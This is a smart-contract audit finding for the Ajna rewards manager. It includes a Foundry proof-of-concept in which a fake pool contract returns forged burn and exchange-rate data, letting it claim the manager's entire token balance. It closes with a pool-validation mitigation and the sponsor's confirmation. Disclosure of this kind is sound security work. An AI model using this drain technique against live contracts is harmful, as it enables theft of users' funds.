The following test can be placed inhttps://github.com/code-423n4/2023-05-ajna/tree/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/tests/forge/unit/RewardsasStealRewards.t.soland then run withforge test -m testStealRewards -vv, showing that an attacker can steal all of the ajna tokens held by the rewards manager:
$ forgetest-m testStealRewards -vvRunning 1testfortests/forge/unit/Rewards/StealRewards.t.sol:StealRewardsTest[PASS]testStealRewards() (gas: 494833)Logs:Rewards balance before: 100000000000000000000000000Hacker balance before:0Rewards balance after:0Hacker balance after:100000000000000000000000000Test result: ok. 1 passed; 0 failed; finishedin6.57s
// SPDX-License-Identifier: UNLICENSEDpragmasolidity0.8.14;import'src/RewardsManager.sol';import'src/PositionManager.sol';import'@std/Test.sol';import'@std/Vm.sol';contractStealRewards{ERC20ajnaToken;IRewardsManagerrewardsManager;uint256_currentBurnEpoch;uint256toSteal;constructor(ERC20_ajnaToken,IRewardsManager_rewardsManager) {ajnaToken=_ajnaToken;rewardsManager=_rewardsManager;}functioncurrentBurnEpoch()externalviewreturns(uint256) {return_currentBurnEpoch;}functionbucketExchangeRate(uint)externalviewreturns(uint256) {return1ether+_currentBurnEpoch;}functionburnInfo(uint256index)externalviewreturns(uint256burnBlock_,uint256totalInterest_,uint256totalBurned_) {if(index==1) {return(block.timestamp+2weeks,0,0);}else{return(block.timestamp+2weeks,1,toSteal*20);}}functionbucketInfo(uint256)externalpurereturns(uint256lpAccumulator_,uint256availableCollateral_,uint256bankruptcyTime_,uint256bucketDeposit_,uint256bucketScale_) {return(0,0,0,1ether,0);}functionsteal()external{toSteal=ajnaToken.balanceOf(address(rewardsManager));uint256[]memorydepositIndexes=newuint256[](1);depositIndexes[0] =0;// setup the `prevBucketExchangeRate`_currentBurnEpoch=1;rewardsManager.updateBucketExchangeRatesAndClaim(address(this),depositIndexes);_currentBurnEpoch=2;rewardsManager.updateBucketExchangeRatesAndClaim(address(this),depositIndexes);}}contractStealRewardsTestisTest{addressinternal_ajna=0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079;ERC20internal_ajnaToken;IRewardsManagerinternal_rewardsManager;IPositionManagerinternal_positionManager;ERC20PoolFactoryinternal_poolFactory;functionsetUp()external{vm.createSelectFork(vm.envString("ETH_RPC_URL"));_ajnaToken=ERC20(_ajna);_poolFactory=newERC20PoolFactory(_ajna);_positionManager=newPositionManager(_poolFactory,newERC721PoolFactory(_ajna));_rewardsManager=newRewardsManager(_ajna,_positionManager);deal(_ajna,address(_rewardsManager),100_000_000*1e18);assertEq(_ajnaToken.balanceOf(address(_rewardsManager)),100_000_000*1e18);}functiontestStealRewards()external{StealRewardsstealRewards=newStealRewards(_ajnaToken,_rewardsManager);uintrewardsManagerBalance=_ajnaToken.balanceOf(address(_rewardsManager));emitlog_named_uint("Rewards balance before",rewardsManagerBalance);emitlog_named_uint("Hacker balance before ",_ajnaToken.balanceOf(address(stealRewards)));stealRewards.steal();assertEq(_ajnaToken.balanceOf(address(stealRewards)),rewardsManagerBalance);assertEq(_ajnaToken.balanceOf(address(_rewardsManager)),0);emitlog_named_uint("Rewards balance after ",_ajnaToken.balanceOf(address(_rewardsManager)));emitlog_named_uint("Hacker balance after  ",_ajnaToken.balanceOf(address(stealRewards)));}}
Tools Used
Foundry, IntelliJ
Recommended Mitigation Steps
TheupdateBucketExchangeRatesAndClaimmethod should only be able to be called with a valid Ajna pool (seePositionManager._isAjnaPool) and potentially only allow pools from the currently staked tokens.
MikeHathaway (Ajna) confirmed via duplicate issue#207

